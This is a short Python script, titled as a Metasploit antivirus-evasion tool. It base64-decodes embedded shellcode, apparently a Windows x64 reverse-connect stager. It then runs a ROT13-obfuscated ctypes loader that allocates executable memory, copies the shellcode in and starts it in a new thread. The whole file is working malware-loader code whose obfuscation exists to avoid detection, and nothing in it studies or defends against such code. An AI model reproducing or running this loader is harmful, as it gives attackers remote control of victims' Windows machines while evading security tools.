# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 8:00 下午
# @Author  : codervibe
# @File    : msf加密免杀.py
# @Project : pythonBasics
import ctypes
import base64
sc = '/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAMx5RTaFA0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V'
shellcode = base64.b64decode(sc)
def rot13(message):
    res = ''
    for item in message:
        if (ord(item) >= ord('A') and ord(item) <= ord('M')) or (ord(item) >= ord('a') and ord(item) <= ord('m')):
            res += chr(ord(item) + 13)
        elif (ord(item) >= ord('N') and ord(item) <= ord('Z')) or (ord(item) >= ord('n') and ord(item) <= ord('z')):
            res += chr(ord(item) - 13)
        else:
            res += item
    return res




loader = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
exec(rot13(loader))